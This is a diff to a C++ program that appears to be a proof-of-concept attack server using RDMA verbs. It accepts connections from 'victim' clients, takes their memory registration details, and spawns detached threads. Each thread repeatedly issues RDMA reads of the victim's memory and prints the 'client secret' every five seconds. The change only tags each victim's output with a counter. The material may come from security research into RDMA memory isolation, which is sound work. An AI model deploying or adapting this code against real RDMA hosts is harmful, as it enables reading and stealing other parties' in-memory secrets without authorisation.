@@ -54,7 +54,7 @@ parse(int argc, char* argv[])
   }
 }
 
-void track_region(VerbsEP *ep, void *ptr, struct ibv_mr *mr) {
+void track_region(VerbsEP *ep, void *ptr, struct ibv_mr *mr, int id) {
   struct ibv_wc wc;
   struct ibv_sge* sges = (struct ibv_sge*)ptr;
 
@@ -63,14 +63,13 @@ void track_region(VerbsEP *ep, void *ptr, struct ibv_mr *mr) {
   printf("Victim's secret should be at: %lu rkey %u \n",sge.addr ,sge.lkey);
  
 
-  /* new thread */
   while(true){
     int ret = ep->read_signaled(0, (uint64_t)ptr, mr->lkey, sge.addr, sge.lkey, 128);
     assert(ret==0 && "Failed to issue an RDMA read.");
     while( ep->poll_send_completion(&wc) == 0){
 
     }
-    printf("[%d]client secret :  %s\n", wc.status, ptr );
+    printf("[%d]client secret :  %s\n", id, ptr );
     std::this_thread::sleep_for(std::chrono::milliseconds(5000));
   }
 }
@@ -105,6 +104,7 @@ int main(int argc, char* argv[]){
  
   struct ibv_pd *pd = server->create_pd();
 
+  int i = 0;
   while (true) {
     printf("Waiting for connection from victim\n");
     VerbsEP* ep = server->acceptEP(&attr,&conn_param,pd);
@@ -120,8 +120,9 @@ int main(int argc, char* argv[]){
     }
     printf("Received memory information from a victim\n");
 
-    std::thread t(track_region, ep, ptr, mr);
+    std::thread t(track_region, ep, ptr, mr, i);
     t.detach();
+    i++;
   }
 
   return 0; 
